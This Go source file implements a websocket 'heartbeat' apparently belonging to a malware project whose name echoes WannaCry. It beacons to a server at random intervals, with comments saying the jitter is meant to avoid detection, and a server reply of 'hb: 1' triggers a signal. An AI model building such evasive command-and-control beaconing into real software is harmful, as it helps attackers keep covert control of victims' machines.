package heartbeat

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/gorilla/websocket"
	"github.com/prairir/imacry/pkg/config"
)

// heartbeat.HeartBeat:
func HeartBeat() {
	// random seed
	// we wanna stay kinda sorta hidden so not the best idea
	// to read from /dev/urandom
	rand.Seed(time.Now().UnixNano())

	for {

		// a random sleep time to stop the heartbeat
		// from going every second
		// or being easily detectable
		//
		// it will randomly sleep between 0s and 1m
		n := rand.Intn(60)
		time.Sleep(time.Duration(n) * time.Second)

		err := config.Config.Conn.WriteMessage(websocket.TextMessage, []byte("hb:"))
		if err != nil {
			config.Config.HBError <- fmt.Errorf("heartbeat.HeartBeat error: %w", err)
			return
		}

		mt, message, err := config.Config.Conn.ReadMessage()
		if err != nil {
			config.Config.HBError <- fmt.Errorf("heartbeat.HeartBeat error: %w", err)
			return
		}

		// if its a text message and the message is `hb: 1`
		// close the signal channel and exit
		// else if its a text message and the message is `hb: 0`
		// continue
		if mt == websocket.TextMessage && string(message[:5]) == "hb: 1" {
			close(config.Config.Signal)
			return
		} else if mt == websocket.TextMessage && string(message[:5]) == "hb: 0" {
			continue
		}

	}
}
